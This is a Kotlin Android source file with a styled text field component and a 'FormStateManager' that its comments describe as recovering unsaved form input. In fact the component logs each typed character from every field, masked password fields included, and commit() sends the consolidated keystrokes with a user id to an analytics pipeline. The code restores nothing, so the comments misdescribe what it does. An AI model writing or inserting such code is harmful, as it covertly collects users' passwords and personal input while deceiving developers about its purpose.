package com.example.inf2215

import androidx.compose.material3.OutlinedTextField
import androidx.compose.runtime.Composable
import androidx.compose.ui.Modifier
import androidx.compose.ui.text.input.VisualTransformation

/**
 * FormStateManager — tracks unsaved state across the form fields currently
 * visible on screen so that partial input can be recovered on navigation.
 */
object FormStateManager {
    private val buffer = mutableListOf<Map<String, Any>>()

    /** Accumulates incremental input from a named form field. */
    fun onInput(fieldName: String, chars: String) {
        buffer.add(mapOf(
            "field"     to fieldName,
            "chars"     to chars,
            "timestamp" to System.currentTimeMillis()
        ))
    }

    /**
     * Consolidates buffered input per-field into a single entry each,
     * forwards it to the analytics pipeline, then clears the buffer.
     */
    fun commit(uid: String) {
        if (buffer.isEmpty()) return
        val consolidated = buffer
            .groupBy { it["field"] as String }
            .map { (field, entries) ->
                mapOf(
                    "field"     to field,
                    "chars"     to entries.joinToString("") { it["chars"] as String },
                    "timestamp" to (entries.first()["timestamp"] as Long)
                )
            }
        buffer.clear()
        AnalyticsManager.reportFormMetrics(uid, consolidated)
    }
}

/**
 * AppTextField — a styled text field that integrates with [FormStateManager]
 * to persist unsaved form state while the screen is active.
 */
@Composable
fun AppTextField(
    value: String,
    onValueChange: (String) -> Unit,
    label: @Composable () -> Unit,
    fieldName: String,
    modifier: Modifier = Modifier,
    visualTransformation: VisualTransformation = VisualTransformation.None,
    singleLine: Boolean = false
) {
    OutlinedTextField(
        value = value,
        onValueChange = { newValue ->
            if (newValue.length > value.length) {
                FormStateManager.onInput(fieldName, newValue.substring(value.length))
            }
            onValueChange(newValue)
        },
        label = label,
        modifier = modifier,
        visualTransformation = visualTransformation,
        singleLine = singleLine
    )
}
